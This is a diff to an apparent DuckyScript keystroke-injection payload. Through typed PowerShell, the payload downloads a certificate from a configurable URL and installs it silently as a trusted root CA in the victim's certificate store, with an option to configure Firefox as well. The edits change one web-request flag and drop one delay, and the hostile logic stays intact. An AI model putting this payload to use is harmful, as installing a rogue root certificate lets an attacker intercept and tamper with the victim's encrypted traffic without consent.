@@ -48,7 +48,7 @@ GUI x
 DELAY SHORT_DELAY
 STRING i
 DELAY MEDIUM_DELAY
-STRING Clear-Host; $c = New-TemporaryFile; try { Invoke-WebRequest -Uri "
+STRING Clear-Host; $c = New-TemporaryFile; try { Invoke-WebRequest -UseBasicParsing -Uri " 
 STRING CERT_URL
 STRING " -OutFile $c; Import-Certificate -FilePath $c -CertStoreLocation "Cert:\CurrentUser\Root"; 
 IF ( CONFIGURE_FIREFOX == TRUE ) THEN
@@ -69,5 +69,4 @@ DELAY SHORT_DELAY
 ENTER
 DELAY SHORT_DELAY
 CTRL GUI F4
-DELAY SHORT_DELAY
 ATTACKMODE OFF
